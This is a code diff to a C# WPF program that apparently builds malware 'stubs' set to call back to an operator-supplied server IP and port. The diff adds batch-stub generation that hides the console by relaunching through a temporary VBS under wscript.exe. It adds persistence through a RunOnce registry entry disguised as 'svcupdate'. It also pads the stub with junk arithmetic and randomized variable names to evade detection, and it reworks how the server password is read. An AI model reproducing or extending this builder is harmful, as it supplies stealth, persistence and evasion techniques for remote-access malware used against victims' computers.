@@ -2988,14 +2988,14 @@ namespace WpfApp
             builderOutputTextBox.Text = "Ready to generate stub...";
 
             string port = builderPortTextBox.Text.Trim();
-            string password = builderPasswordBox.Text.Trim();
+            string password = _builderActualPassword;
             string serverIp = builderIpTextBox.Text.Trim();
             string encKey = builderEncryptionKeyTextBox.Text.Trim();
 
             if (!ValidateBuilderInputs())
             {
                 BuilderOutput("ERROR: Validation failed — check inputs");
-                UpdateStatus("Stub generation failed.");
+                UpdateStatus("PS1 stub generation failed.");
                 return;
             }
 
@@ -3042,7 +3042,7 @@ namespace WpfApp
             builderOutputTextBox.Text = "Ready to generate stub...";
 
             string port = builderPortTextBox.Text.Trim();
-            string password = builderPasswordBox.Text.Trim();
+            string password = _builderActualPassword;
             string serverIp = builderIpTextBox.Text.Trim();
             string encKey = builderEncryptionKeyTextBox.Text.Trim();
 
@@ -3220,7 +3220,7 @@ namespace WpfApp
             builderOutputTextBox.Text = "Ready to generate stub...";
 
             string port = builderPortTextBox.Text.Trim();
-            string password = builderPasswordBox.Text.Trim();
+            string password = _builderActualPassword;
             string serverIp = builderIpTextBox.Text.Trim();
             string encKey = builderEncryptionKeyTextBox.Text.Trim();
 
@@ -3297,11 +3297,21 @@ namespace WpfApp
 
             string VarName() => "x" + Guid.NewGuid().ToString("N").Substring(0, rng.Next(4, 8));
 
-            // ---- UTF-16 BOM ----
-            sb.Append('\xFEFF');
-
-            // ---- @echo off ----
+            // ---- @echo off + setlocal ----
             sb.AppendLine("@echo off");
+            sb.AppendLine("setlocal");
+
+            // ---- self-launch VBS to hide console window (relaunch silently via wscript.exe) ----
+            sb.AppendLine("if exist \"%temp%\\r.flag\" goto :main");
+            sb.AppendLine("cd. > \"%temp%\\r.flag\"");
+            sb.AppendLine("echo CreateObject(\"WScript.Shell\").Run \"\"\"%~f0\"\"\", 0, False > \"%temp%\\r.vbs\"");
+            sb.AppendLine("wscript.exe \"%temp%\\r.vbs\"");
+            sb.AppendLine("exit /b");
+            sb.AppendLine(":main");
+            sb.AppendLine("del \"%temp%\\r.flag\" \"%temp%\\r.vbs\" 2>nul");
+
+            // ---- RunOnce persistence (re-run stub on next login) ----
+            sb.AppendLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"svcupdate\" /d \"\\\"%~f0\\\"\" /f");
 
             // ---- junk arithmetic at top ----
             int junkCount = rng.Next(3, 6);
@@ -3458,7 +3468,7 @@ namespace WpfApp
                 .Replace("{{SERVER_URL}}", $"{builderIpTextBox.Text.Trim()}:{builderPortTextBox.Text.Trim()}")
                 .Replace("{{CERTIFICATE}}", certBase64)
                 .Replace("{{SILENT_MODE}}", silentMode ? "true" : "false")
-                .Replace("{{PASSWORD}}", builderPasswordBox.Text);
+                .Replace("{{PASSWORD}}", _builderActualPassword);
 
             if (stubCode.Contains("{{SILENT_MODE}}"))
             {
@@ -3513,7 +3523,7 @@ namespace WpfApp
                 return false;
             }
 
-            if (string.IsNullOrWhiteSpace(builderPasswordBox.Text) || builderPasswordBox.Text.Trim().Length < 12)
+            if (string.IsNullOrWhiteSpace(_builderActualPassword) || _builderActualPassword.Length < 12)
             {
                 AppendLog("ERROR: Server password must be at least 12 characters.");
                 BuilderOutput("ERROR: Server password must be at least 12 characters.");
